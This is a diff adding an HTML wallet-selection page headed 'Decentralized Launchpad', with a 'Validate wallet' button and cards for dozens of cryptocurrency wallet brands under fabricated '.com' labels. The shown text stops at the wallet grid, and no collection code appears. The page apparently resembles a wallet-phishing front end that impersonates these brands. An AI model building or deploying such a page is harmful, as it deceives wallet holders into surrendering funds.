@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="/font-awesome-4.7.0/" rel="stylesheet" />
+    <link rel="icon" sizes="180x180" href="image/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="font-awesome-4.7.0/css/font-awesome.min.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://cdn.tailwindcss.com/2.2.19/tailwind.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;700&display=swap"
+      rel="stylesheet"/>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>wallet</title>
+
+    <style>
+
+        @keyframes moveBackAndForth {
+            0%, 100% {
+              left: 0;
+            }
+            50% {
+              left: calc(100% - 30px);
+            }
+          }
+
+        .backgrond{
+            background-image: linear-gradient(to right, #201b82, #561e87, #84208c);
+        }
+        .move{
+            animation: moveBackAndForth 5s linear infinite alternate;
+        }
+    </style>
+
+</head>
+<body class="relative" >
+
+    <div id="body">
+
+        <header class="text-white backgrond">
+
+            <div class="md:max-w-[1300px] w-full py-[15px] px-[4px] items-center justify-between mx-auto flex">
+    
+                <h2 class="md:text-[20px] text-[14px] font-bold">Decentralized Launchpad</h2>
+    
+                <div class="flex  lg:gap-4 justify-center items-center">
+                    <svg stroke="currentColor" fill="white" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg" style="font-size: 1.5em;">
+                        <path d="M10 18a7.952 7.952 0 0 0 4.897-1.688l4.396 4.396 1.414-1.414-4.396-4.396A7.952 7.952 0 0 0 18 10c0-4.411-3.589-8-8-8s-8 3.589-8 8 3.589 8 8 8zm0-14c3.309 0 6 2.691 6 6s-2.691 6-6 6-6-2.691-6-6 2.691-6 6-6z">
+                        </path>
+                    </svg>
+    
+                    <div class="md:mx-2 hidden md:flex border-2 border-white p-[8px] md:p-[13px] gap-2 justify-center rounded-full md:rounded-xl">
+                        <svg stroke="currentColor" fill="white" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M461.2 128H80c-8.84 0-16-7.16-16-16s7.16-16 16-16h384c8.84 0 16-7.16 16-16 0-26.51-21.49-48-48-48H64C28.65 32 0 60.65 0 96v320c0 35.35 28.65 64 64 64h397.2c28.02 0 50.8-21.53 50.8-48V176c0-26.47-22.78-48-50.8-48zM416 336c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z">
+                            </path>
+                        </svg>
+                    
+                        <h3 class="text-[14px]">Validate wallet</h3>
+        
+                    </div>
+    
+                    <div class="  mx-3 md:hidden flex border-2 border-white p-[8px] md:p-[13px] gap-2 justify-center rounded-full md:rounded-xl">
+                        <svg stroke="currentColor" fill="white" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M461.2 128H80c-8.84 0-16-7.16-16-16s7.16-16 16-16h384c8.84 0 16-7.16 16-16 0-26.51-21.49-48-48-48H64C28.65 32 0 60.65 0 96v320c0 35.35 28.65 64 64 64h397.2c28.02 0 50.8-21.53 50.8-48V176c0-26.47-22.78-48-50.8-48zM416 336c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z">
+                            </path>
+                        </svg>
+                    </div>
+    
+                </div>
+            </div>
+    
+            
+            
+    
+        </header>
+    
+        <section class="w-full xl:max-w-[1200px] mx-auto lg:py-9 py-6">
+            
+            <h2 class="text-center text-[20px] font-semibold mt-5">Select a Wallet</h2>
+    
+            <div class="flex md:flex-row flex-col flex-wrap justify-center lg:mt-8 mt-5 gap-6">
+    
+                <div onclick="myFunction(0)" class=" shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Metamask.PNG" class="w-[30%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Metamask</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Metamask.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(1)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/trust.PNG" class="w-[30%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Trust Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Trust Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(2)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Crypto Wallet.jpg" class="w-[30%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Crypto Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Crypto Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(3)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Defi Wallet.PNG" class="w-[30%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Defi Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Defi Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(4)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Parallel Wallet.jpg" class="w-[30%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Parallel Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Parallel Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(5)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Juno Wallet.jpg" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Juno Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Juno Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(6)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Kyber Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Kyber Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Kyber Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(7)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Polka Dot.jpg" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Polka Dot</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Polka Dot.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(8)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Crypto.com  DeFi Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[15px] font-bold">Crypto.com  DeFi Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[10px]">Crypto.com  DeFi Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(9)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Rainbow.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Rainbow</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Rainbow.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(10)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Argent.JPG" class="w-[30%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Argent</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Argent.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(11)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Gnosis Safe Multisig.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Gnosis Safe Multisig</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Gnosis Safe Multisig.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(12)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Atomic.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Atomic</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Atomic.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(13)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Pillar.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Pillar</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Pillar.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(14)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Phantom.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Phantom</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Phantom.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(15)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/coin98.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Coin98</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Coin98.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(16)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Alice.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Alice</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Alice.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(17)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/imToken.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">imToken</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">imToken.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(18)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Anchor.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Anchor</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Anchor.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(19)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/ONTO.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">ONTO</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">ONTO.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(20)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/TokenPocket.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">TokenPocket</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">TokenPocket.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(21)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Math Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Math Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Math Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(22)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/BitPay.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">BitPay</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">BitPay.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(23)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Maiar.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Maiar</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Maiar.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(24)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Ledger Live.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Ledger Live</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Ledger Live.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(25)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Walleth.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Walleth</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Walleth.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(26)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Authereum.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Authereum</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Authereum.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(27)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Huobi Wallet.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Huobi Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Huobi Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(28)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Eidoo.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Eidoo</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Eidoo.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(29)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/MYKEY.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">MYKEY</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">MYKEY.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(30)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Loopring Wallet.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Loopring Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Loopring Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(31)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/CoolWallet S.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">CoolWallet S</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">CoolWallet S.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(32)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Alice.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Alice</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Alice.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(33)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Alpha Wallet.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Alpha Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Alpha Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(34)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/D'CENT Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">D'CENT Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">D'CENT Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(35)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Defi Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">ZelCore</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">ZelCore.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(36)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Nash.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Nash</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Nash.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(37)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Coinomi.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Coinomi</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Coinomi.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(38)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/GridPlus.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">GridPlus</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">GridPlus.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(39)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/CYBAVO Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">CYBAVO Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">CYBAVO Wallet.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(40)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Tokenary.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Tokenary</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Tokenary.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(41)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Wazirx.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Wazirx</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Wazirx.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(42)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Torus.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Torus</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Torus.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(43)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Spatium.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Spatium</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Spatium.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(44)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/SafePal.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">SafePal</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">SafePal.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(45)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Equal.JPG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Equal</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Equal.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(46)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%]  md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Infinito.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Infinito</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Infinito.com</h4>
+                    </div>
+                </div>
+    
+                <div onclick="myFunction(47)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Wallet.io.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Wallet.io</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Wallet.io.com</h4>
+                    </div>
+                </div>
+    
+                <div  onclick="myFunction(48)" class="shadow-xl lg:w-[31%] md:w-[39px] w-[83%] xl:w-[23%] md:mx-0  mx-9 lg:mx-0 rounded-lg border  flex gap-2 items-center justify-center">
+                    <img src="image/Infinity Wallet.PNG" class="w-[25%] justify-start flex " alt="">
+                    <div class="flex flex-col lg:gap-1 py-5 mx-4">
+                        <h4 class="text-slate-800 text-[17px] font-bold">Infinity Wallet</h4>
+                        <h4 class="text-slate-900 font-semibold text-[13px]">Infinity Wallet.com</h4>
+                    </div>
+                </div>
+    
